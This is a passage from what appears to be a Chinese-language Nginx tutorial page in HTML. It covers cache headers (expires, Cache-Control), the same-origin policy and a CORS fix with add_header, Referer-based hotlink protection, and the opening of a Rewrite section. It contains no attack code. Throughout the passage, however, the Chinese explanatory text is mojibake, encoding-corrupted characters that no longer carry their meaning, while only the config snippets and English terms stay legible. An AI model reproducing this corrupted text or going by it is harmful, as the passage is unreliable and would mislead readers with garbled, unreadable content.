æµè§ˆå™¨ç¼“å­˜ç›¸å…³æŒ‡ä»¤</h4><p>Nginxéœ€è¦è¿›è¡Œç¼“å­˜ç›¸å…³è®¾ç½®ï¼Œå°±éœ€è¦ç”¨åˆ°å¦‚ä¸‹çš„æŒ‡ä»¤</p><h5 id="expiresæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#expiresæŒ‡ä»¤"></a> expiresæŒ‡ä»¤</h5><p>expires:è¯¥æŒ‡ä»¤ç”¨æ¥æ§åˆ¶é¡µé¢ç¼“å­˜çš„ä½œç”¨ã€‚å¯ä»¥é€šè¿‡è¯¥æŒ‡ä»¤æ§åˆ¶HTTPåº”ç­”ä¸­çš„â€œExpires&quot;å’Œâ€Cache-Control&quot;</p><table><thead><tr><th>è¯­æ³•</th><th>expires   [modified] time<br/>expires epoch|max|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>expires off;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>time:å¯ä»¥æ•´æ•°ä¹Ÿå¯ä»¥æ˜¯è´Ÿæ•°ï¼ŒæŒ‡å®šè¿‡æœŸæ—¶é—´ï¼Œå¦‚æœæ˜¯è´Ÿæ•°ï¼ŒCache-Controlåˆ™ä¸ºno-cache,å¦‚æœä¸ºæ•´æ•°æˆ–0ï¼Œåˆ™Cache-Controlçš„å€¼ä¸ºmax-age=time;</p><p>epoch: æŒ‡å®šExpiresçš„å€¼ä¸ºâ€™1 January,1970,00:00:01 GMTâ€™(1970-01-01 00:00:00)ï¼ŒCache-Controlçš„å€¼no-cache</p><p>max:æŒ‡å®šExpiresçš„å€¼ä¸ºâ€™31 December2037 23:59:59GMTâ€™ (2037-12-31 23:59:59) ï¼ŒCache-Controlçš„å€¼ä¸º10å¹´</p><p>off:é»˜è®¤ä¸ç¼“å­˜ã€‚</p><h5 id="add_headeræŒ‡ä»¤"><a class="markdownIt-Anchor" href="#add_headeræŒ‡ä»¤"></a> add_headeræŒ‡ä»¤</h5><p>add_headeræŒ‡ä»¤æ˜¯ç”¨æ¥æ·»åŠ æŒ‡å®šçš„å“åº”å¤´å’Œå“åº”å€¼ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>add_header name value [always];</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€locationâ€¦</td></tr></tbody></table><p>Cache-Controlä½œä¸ºå“åº”å¤´ä¿¡æ¯ï¼Œå¯ä»¥è®¾ç½®å¦‚ä¸‹å€¼ï¼š</p><p>ç¼“å­˜å“åº”æŒ‡ä»¤ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Cache-control:</span> <span class="hljs-string">must-revalidate</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-literal">no</span><span class="hljs-string">-cache</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-literal">no</span><span class="hljs-string">-store</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-literal">no</span><span class="hljs-string">-transform</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-string">public</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-string">private</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-string">proxy-revalidate</span><br><span class="hljs-attr">Cache-Control:</span> <span class="hljs-string">max-age=&lt;seconds&gt;</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-string">s-maxage=&lt;seconds&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>æŒ‡ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>must-revalidate</td><td>å¯ç¼“å­˜ä½†å¿…é¡»å†å‘æºæœåŠ¡å™¨è¿›è¡Œç¡®è®¤</td></tr><tr><td>no-cache</td><td>ç¼“å­˜å‰å¿…é¡»ç¡®è®¤å…¶æœ‰æ•ˆæ€§</td></tr><tr><td>no-store</td><td>ä¸ç¼“å­˜è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•å†…å®¹</td></tr><tr><td>no-transform</td><td>ä»£ç†ä¸å¯æ›´æ”¹åª’ä½“ç±»å‹</td></tr><tr><td>public</td><td>å¯å‘ä»»æ„æ–¹æä¾›å“åº”çš„ç¼“å­˜</td></tr><tr><td>private</td><td>ä»…å‘ç‰¹å®šç”¨æˆ·è¿”å›å“åº”</td></tr><tr><td>proxy-revalidate</td><td>è¦æ±‚ä¸­é—´ç¼“å­˜æœåŠ¡å™¨å¯¹ç¼“å­˜çš„å“åº”æœ‰æ•ˆæ€§å†è¿›è¡Œç¡®è®¤</td></tr><tr><td>max-age=&lt;ç§’&gt;</td><td>å“åº”æœ€å¤§Ageå€¼</td></tr><tr><td>s-maxage=&lt;ç§’&gt;</td><td>å…¬å…±ç¼“å­˜æœåŠ¡å™¨å“åº”çš„æœ€å¤§Ageå€¼</td></tr></tbody></table><p>max-age=[ç§’]ï¼š</p><h3 id="nginxçš„è·¨åŸŸé—®é¢˜è§£å†³"><a class="markdownIt-Anchor" href="#nginxçš„è·¨åŸŸé—®é¢˜è§£å†³"></a> Nginxçš„è·¨åŸŸé—®é¢˜è§£å†³</h3><p>è¿™å—å†…å®¹ï¼Œæˆ‘ä»¬ä¸»è¦ä»ä»¥ä¸‹æ–¹é¢è¿›è¡Œè§£å†³ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">ä»€ä¹ˆæƒ…å†µä¸‹ä¼šå‡ºç°è·¨åŸŸé—®é¢˜?<br>å®ä¾‹æ¼”ç¤ºè·¨åŸŸé—®é¢˜<br>å…·ä½“çš„è§£å†³æ–¹æ¡ˆæ˜¯ä»€ä¹ˆ?<br></code></pre></td></tr></table></figure><h4 id="åŒæºç­–ç•¥"><a class="markdownIt-Anchor" href="#åŒæºç­–ç•¥"></a> åŒæºç­–ç•¥</h4><p>æµè§ˆå™¨çš„åŒæºç­–ç•¥ï¼šæ˜¯ä¸€ç§çº¦å®šï¼Œæ˜¯æµè§ˆå™¨æœ€æ ¸å¿ƒä¹Ÿæ˜¯æœ€åŸºæœ¬çš„å®‰å…¨åŠŸèƒ½ï¼Œå¦‚æœæµè§ˆå™¨å°‘äº†åŒæºç­–ç•¥ï¼Œåˆ™æµè§ˆå™¨çš„æ­£å¸¸åŠŸèƒ½å¯èƒ½éƒ½ä¼šå—åˆ°å½±å“ã€‚</p><p>åŒæº:  åè®®ã€åŸŸå(IP)ã€ç«¯å£ç›¸åŒå³ä¸ºåŒæº</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>https:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>ä¸<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.132</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>ä¸<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>ä¸<br><br>http:<span class="hljs-regexp">//</span>www.nginx.com<span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>www.nginx.org<span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>ä¸<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>ä¸<br><br>http:<span class="hljs-regexp">//</span>www.nginx.org:<span class="hljs-number">80</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>www.nginx.org<span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>æ»¡è¶³<br></code></pre></td></tr></table></figure><h4 id="è·¨åŸŸé—®é¢˜"><a class="markdownIt-Anchor" href="#è·¨åŸŸé—®é¢˜"></a> è·¨åŸŸé—®é¢˜</h4><p>ç®€å•æè¿°ä¸‹:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">æœ‰ä¸¤å°æœåŠ¡å™¨åˆ†åˆ«ä¸º<span class="hljs-selector-tag">A</span>,<span class="hljs-selector-tag">B</span>,å¦‚æœä»æœåŠ¡å™¨<span class="hljs-selector-tag">A</span>çš„é¡µé¢å‘é€å¼‚æ­¥è¯·æ±‚åˆ°æœåŠ¡å™¨<span class="hljs-selector-tag">B</span>è·å–æ•°æ®ï¼Œå¦‚æœæœåŠ¡å™¨<span class="hljs-selector-tag">A</span>å’ŒæœåŠ¡å™¨<span class="hljs-selector-tag">B</span>ä¸æ»¡è¶³åŒæºç­–ç•¥ï¼Œåˆ™å°±ä¼šå‡ºç°è·¨åŸŸé—®é¢˜ã€‚<br></code></pre></td></tr></table></figure><h4 id="è·¨åŸŸé—®é¢˜çš„æ¡ˆä¾‹æ¼”ç¤º"><a class="markdownIt-Anchor" href="#è·¨åŸŸé—®é¢˜çš„æ¡ˆä¾‹æ¼”ç¤º"></a> è·¨åŸŸé—®é¢˜çš„æ¡ˆä¾‹æ¼”ç¤º</h4><p>å‡ºç°è·¨åŸŸé—®é¢˜ä¼šæœ‰ä»€ä¹ˆæ•ˆæœ?,æ¥ä¸‹æ¥é€šè¿‡ä¸€ä¸ªéœ€æ±‚æ¥ç»™å¤§å®¶æ¼”ç¤ºä¸‹ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581766282200.png" alt="" />ï¼ˆ1ï¼‰nginxçš„htmlç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªa.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>è·¨åŸŸé—®é¢˜æ¼”ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;jquery.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            $(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                $(<span class="hljs-string">&quot;#btn&quot;</span>).<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                        $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;http://192.168.200.133:8080/getUser&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;</span><br><span class="language-javascript">                                <span class="hljs-title function_">alert</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));</span><br><span class="language-javascript">                        &#125;);</span><br><span class="language-javascript">                &#125;);</span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;è·å–æ•°æ®&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;btn&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰åœ¨nginx.confé…ç½®å¦‚ä¸‹å†…å®¹</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span>&#123;<br>        <span class="hljs-keyword">listen</span>  <span class="hljs-number">8080</span>;<br>        server_name localhost;<br>        <span class="hljs-keyword">location</span> /getUser&#123;<br>                default_type application/<span class="hljs-type">json</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;TOM&quot;,&quot;age&quot;:18&#125;&#x27;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_name localhost;<br><span class="hljs-keyword">location</span> /&#123;<br>root html;<br><span class="hljs-keyword">index</span> <span class="hljs-keyword">index</span>.html;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(3)é€šè¿‡æµè§ˆå™¨è®¿é—®æµ‹è¯•</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1588004913681.png" alt="1588004913681" /></p><h4 id="è§£å†³æ–¹æ¡ˆ"><a class="markdownIt-Anchor" href="#è§£å†³æ–¹æ¡ˆ"></a> è§£å†³æ–¹æ¡ˆ</h4><p>ä½¿ç”¨add_headeræŒ‡ä»¤ï¼Œè¯¥æŒ‡ä»¤å¯ä»¥ç”¨æ¥æ·»åŠ ä¸€äº›å¤´ä¿¡æ¯</p><table><thead><tr><th>è¯­æ³•</th><th>add_header name  valueâ€¦</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>æ­¤å¤„ç”¨æ¥è§£å†³è·¨åŸŸé—®é¢˜ï¼Œéœ€è¦æ·»åŠ ä¸¤ä¸ªå¤´ä¿¡æ¯ï¼Œä¸€ä¸ªæ˜¯<code>Access-Control-Allow-Origin</code>,<code>Access-Control-Allow-Methods</code></p><p>Access-Control-Allow-Origin: ç›´è¯‘è¿‡æ¥æ˜¯å…è®¸è·¨åŸŸè®¿é—®çš„æºåœ°å€ä¿¡æ¯ï¼Œå¯ä»¥é…ç½®å¤šä¸ª(å¤šä¸ªç”¨é€—å·åˆ†éš”)ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>*</code>ä»£è¡¨æ‰€æœ‰æº</p><p>Access-Control-Allow-Methods:ç›´è¯‘è¿‡æ¥æ˜¯å…è®¸è·¨åŸŸè®¿é—®çš„è¯·æ±‚æ–¹å¼ï¼Œå€¼å¯ä»¥ä¸º GET POST PUT DELETEâ€¦,å¯ä»¥å…¨éƒ¨è®¾ç½®ï¼Œä¹Ÿå¯ä»¥æ ¹æ®éœ€è¦è®¾ç½®ï¼Œå¤šä¸ªç”¨é€—å·åˆ†éš”</p><p>å…·ä½“é…ç½®æ–¹å¼</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">location</span> /getUser&#123;<br>    add_header <span class="hljs-keyword">Access</span>-Control-Allow-Origin *;<br>    add_header <span class="hljs-keyword">Access</span>-Control-Allow-Methods <span class="hljs-keyword">GET</span>,POST,PUT,<span class="hljs-keyword">DELETE</span>;<br>    default_type application/<span class="hljs-type">json</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;TOM&quot;,&quot;age&quot;:18&#125;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é™æ€èµ„æºé˜²ç›—é“¾"><a class="markdownIt-Anchor" href="#é™æ€èµ„æºé˜²ç›—é“¾"></a> é™æ€èµ„æºé˜²ç›—é“¾</h3><h4 id="ä»€ä¹ˆæ˜¯èµ„æºç›—é“¾"><a class="markdownIt-Anchor" href="#ä»€ä¹ˆæ˜¯èµ„æºç›—é“¾"></a> ä»€ä¹ˆæ˜¯èµ„æºç›—é“¾</h4><p>èµ„æºç›—é“¾æŒ‡çš„æ˜¯æ­¤å†…å®¹ä¸åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šï¼Œè€Œæ˜¯é€šè¿‡æŠ€æœ¯æ‰‹æ®µï¼Œç»•è¿‡åˆ«äººçš„é™åˆ¶å°†åˆ«äººçš„å†…å®¹æ”¾åˆ°è‡ªå·±é¡µé¢ä¸Šæœ€ç»ˆå±•ç¤ºç»™ç”¨æˆ·ã€‚ä»¥æ­¤æ¥ç›—å–å¤§ç½‘ç«™çš„ç©ºé—´å’Œæµé‡ã€‚ç®€è€Œè¨€ä¹‹å°±æ˜¯ç”¨åˆ«äººçš„ä¸œè¥¿æˆå°±è‡ªå·±çš„ç½‘ç«™ã€‚</p><p>æ•ˆæœæ¼”ç¤º</p><p>äº¬ä¸œ:<a href="https://img14.360buyimg.com/n7/jfs/t1/101062/37/2153/254169/5dcbd410E6d10ba22/4ddbd212be225fcd.jpg">https://img14.360buyimg.com/n7/jfs/t1/101062/37/2153/254169/5dcbd410E6d10ba22/4ddbd212be225fcd.jpg</a></p><p>ç™¾åº¦:<a href="https://pics7.baidu.com/feed/cf1b9d16fdfaaf516f7e2011a7cda1e8f11f7a1a.jpeg?token=551979a23a0995e5e5279b8fa1a48b34&amp;s=BD385394D2E963072FD48543030030BB">https://pics7.baidu.com/feed/cf1b9d16fdfaaf516f7e2011a7cda1e8f11f7a1a.jpeg?token=551979a23a0995e5e5279b8fa1a48b34&amp;s=BD385394D2E963072FD48543030030BB</a></p><p>æˆ‘ä»¬è‡ªå·±å‡†å¤‡ä¸€ä¸ªé¡µé¢ï¼Œåœ¨é¡µé¢ä¸Šå¼•å…¥è¿™ä¸¤ä¸ªå›¾ç‰‡æŸ¥çœ‹æ•ˆæœ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581827029973.png" alt="" /></p><p>ä»ä¸Šé¢çš„æ•ˆæœï¼Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œä¸‹é¢çš„å›¾ç‰‡åœ°å€æ·»åŠ äº†é˜²æ­¢ç›—é“¾çš„åŠŸèƒ½ï¼Œäº¬ä¸œè¿™è¾¹æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨å…¶å›¾ç‰‡ã€‚</p><h4 id="nginxé˜²ç›—é“¾çš„å®ç°åŸç†"><a class="markdownIt-Anchor" href="#nginxé˜²ç›—é“¾çš„å®ç°åŸç†"></a> Nginxé˜²ç›—é“¾çš„å®ç°åŸç†ï¼š</h4><p>äº†è§£é˜²ç›—é“¾çš„åŸç†ä¹‹å‰ï¼Œæˆ‘ä»¬å¾—å…ˆå­¦ä¹ ä¸€ä¸ªHTTPçš„å¤´ä¿¡æ¯Referer,å½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬éƒ½ä¼šå¸¦ä¸ŠReferer,æ¥å‘Šè¯‰æµè§ˆå™¨è¯¥ç½‘é¡µæ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581769820325.png" alt="" /></p><p>åå°æœåŠ¡å™¨å¯ä»¥æ ¹æ®è·å–åˆ°çš„è¿™ä¸ªRefererä¿¡æ¯æ¥åˆ¤æ–­æ˜¯å¦ä¸ºè‡ªå·±ä¿¡ä»»çš„ç½‘ç«™åœ°å€ï¼Œå¦‚æœæ˜¯åˆ™æ”¾è¡Œç»§ç»­è®¿é—®ï¼Œå¦‚æœä¸æ˜¯åˆ™å¯ä»¥è¿”å›403(æœåŠ¡ç«¯æ‹’ç»è®¿é—®)çš„çŠ¶æ€ä¿¡æ¯ã€‚</p><p>åœ¨æœ¬åœ°æ¨¡æ‹Ÿä¸Šè¿°çš„æœåŠ¡å™¨æ•ˆæœï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581769079083.png" alt="" /></p><p>Nginxé˜²ç›—é“¾çš„å…·ä½“å®ç°:</p><p>valid_referers:nginxä¼šé€šå°±è¿‡æŸ¥çœ‹refererè‡ªåŠ¨å’Œvalid_referersåé¢çš„å†…å®¹è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…åˆ°äº†å°±å°†$invalid_refererå˜é‡ç½®0ï¼Œå¦‚æœæ²¡æœ‰åŒ¹é…åˆ°ï¼Œåˆ™å°†$invalid_refererå˜é‡ç½®ä¸º1ï¼ŒåŒ¹é…çš„è¿‡ç¨‹ä¸­ä¸åŒºåˆ†å¤§å°å†™ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>valid_referers none|blocked|server_names|stringâ€¦</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>serverã€location</td></tr></tbody></table><p>none: å¦‚æœHeaderä¸­çš„Refererä¸ºç©ºï¼Œå…è®¸è®¿é—®</p><p>blocked:åœ¨Headerä¸­çš„Refererä¸ä¸ºç©ºï¼Œä½†æ˜¯è¯¥å€¼è¢«é˜²ç«å¢™æˆ–ä»£ç†è¿›è¡Œä¼ªè£…è¿‡ï¼Œå¦‚ä¸å¸¦&quot;http://&quot; ã€&quot;https://&quot;ç­‰åè®®å¤´çš„èµ„æºå…è®¸è®¿é—®ã€‚</p><p>server_names:æŒ‡å®šå…·ä½“çš„åŸŸåæˆ–è€…IP</p><p>string: å¯ä»¥æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼å’Œ*çš„å­—ç¬¦ä¸²ã€‚å¦‚æœæ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œéœ€è¦ä»¥<code>~</code>å¼€å¤´è¡¨ç¤ºï¼Œä¾‹å¦‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> ~*\.(png|jpg|gif)&#123;<br>           <span class="hljs-attribute">valid_referers</span> <span class="hljs-literal">none</span> <span class="hljs-literal">blocked</span> www.baidu.com <span class="hljs-number">192.168.200.222</span> <span class="hljs-regexp">*.example.com</span> <span class="hljs-regexp">example.*</span>  www.example.org  ~\.google\.;<br>           <span class="hljs-attribute">if</span> (<span class="hljs-variable">$invalid_referer</span>)&#123;<br>                <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>           &#125;<br>           <span class="hljs-attribute">root</span> /usr/local/nginx/html;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>é‡åˆ°çš„é—®é¢˜:å›¾ç‰‡æœ‰å¾ˆå¤šï¼Œè¯¥å¦‚ä½•æ‰¹é‡è¿›è¡Œé˜²ç›—é“¾ï¼Ÿ</p><h4 id="é’ˆå¯¹ç›®å½•è¿›è¡Œé˜²ç›—é“¾"><a class="markdownIt-Anchor" href="#é’ˆå¯¹ç›®å½•è¿›è¡Œé˜²ç›—é“¾"></a> é’ˆå¯¹ç›®å½•è¿›è¡Œé˜²ç›—é“¾</h4><p>é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /images &#123;<br>           <span class="hljs-attribute">valid_referers</span> <span class="hljs-literal">none</span> <span class="hljs-literal">blocked</span> www.baidu.com <span class="hljs-number">192.168.200.222</span> <span class="hljs-regexp">*.example.com</span> <span class="hljs-regexp">example.*</span>  www.example.org  ~\.google\.;<br>           <span class="hljs-attribute">if</span> (<span class="hljs-variable">$invalid_referer</span>)&#123;<br>                <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>           &#125;<br>           <span class="hljs-attribute">root</span> /usr/local/nginx/html;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å¯ä»¥å¯¹ä¸€ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰èµ„æºè¿›è¡Œç¿»åˆ°äº†æ“ä½œã€‚</p><p>é‡åˆ°çš„é—®é¢˜ï¼šRefererçš„é™åˆ¶æ¯”è¾ƒç²—ï¼Œæ¯”å¦‚éšæ„åŠ ä¸€ä¸ªRefererï¼Œä¸Šé¢çš„æ–¹å¼æ˜¯æ— æ³•è¿›è¡Œé™åˆ¶çš„ã€‚é‚£ä¹ˆè¿™ä¸ªé—®é¢˜æ”¹å¦‚ä½•è§£å†³ï¼Ÿ</p><p>æ­¤å¤„æˆ‘ä»¬éœ€è¦ç”¨åˆ°Nginxçš„ç¬¬ä¸‰æ–¹æ¨¡å—<code>ngx_http_accesskey_module</code>ï¼Œç¬¬ä¸‰æ–¹æ¨¡å—å¦‚ä½•å®ç°ç›—é“¾ï¼Œå¦‚æœåœ¨Nginxä¸­ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—çš„åŠŸèƒ½ï¼Œè¿™äº›æˆ‘ä»¬åœ¨åé¢çš„Nginxçš„æ¨¡å—ç¯‡å†è¿›è¡Œè¯¦ç»†çš„è®²è§£ã€‚</p><h2 id="rewriteåŠŸèƒ½é…ç½®"><a class="markdownIt-Anchor" href="#rewriteåŠŸèƒ½é…ç½®"></a> RewriteåŠŸèƒ½é…ç½®</h2><p>Rewriteæ˜¯NginxæœåŠ¡å™¨æä¾›çš„ä¸€ä¸ªé‡è¦åŸºæœ¬åŠŸèƒ½ï¼Œæ˜¯WebæœåŠ¡å™¨äº§å“ä¸­å‡ ä¹å¿…å¤‡çš„åŠŸèƒ½ã€‚ä¸»è¦çš„ä½œç”¨æ˜¯ç”¨æ¥å®ç°URLçš„é‡å†™ã€‚<a href="http://www.jd.com">www.jd.com</a><br />æ³¨æ„:NginxæœåŠ¡å™¨çš„RewriteåŠŸèƒ½çš„å®ç°ä¾èµ–äºPCREçš„æ”¯æŒï¼Œå› æ­¤åœ¨ç¼–è¯‘å®‰è£…NginxæœåŠ¡å™¨ä¹‹å‰ï¼Œéœ€è¦å®‰è£…PCREåº“ã€‚Nginxä½¿ç”¨çš„æ˜¯ngx_http_rewrite_moduleæ¨¡å—æ¥è§£æå’Œå¤„ç†RewriteåŠŸèƒ½çš„ç›¸å…³é…ç½®ã€‚</p><p>Rewriteçš„ç›¸å…³å‘½ä»¤</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 